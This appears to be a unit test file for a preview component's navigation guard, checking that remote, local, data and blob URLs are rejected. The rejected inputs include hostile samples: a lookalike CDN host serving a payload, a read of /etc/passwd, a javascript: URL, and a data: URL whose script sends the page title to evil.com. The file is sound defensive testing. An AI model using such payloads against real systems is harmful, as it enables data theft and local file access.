import { isAllowedPreviewNavigation } from '../previewNavigationPolicy';

describe('SafeArtifactPreview navigation guard', () => {
  it.each(['about:blank', 'about:srcdoc'])(
    'allows the in-memory document the component supplied: %s',
    (url) => {
      expect(isAllowedPreviewNavigation(url)).toBe(true);
    },
  );

  it.each([
    'https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.min.js',
    'https://cdn.jsdelivr.net.evil.com/payload.js',
    'https://evil.com/',
    'http://cdn.jsdelivr.net/npm/mermaid.js',
    'file:///etc/passwd',
    'javascript:alert(1)',
  ])('rejects every remote or local load now that diagrams ship in the app: %s', (url) => {
    expect(isAllowedPreviewNavigation(url)).toBe(false);
  });

  it.each([
    'data:text/html,<script>fetch("https://evil.com/?"+document.title)</script>',
    'data:text/html;base64,PHA+aGk8L3A+',
    'DATA:text/html,<p>hi</p>',
    'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"></svg>',
    'blob:null/3b1d1e8e-5a4f-4c39-9a52-7f0b4f1f3a10',
  ])('rejects a document that would leave the preview policy behind: %s', (url) => {
    expect(isAllowedPreviewNavigation(url)).toBe(false);
  });
});
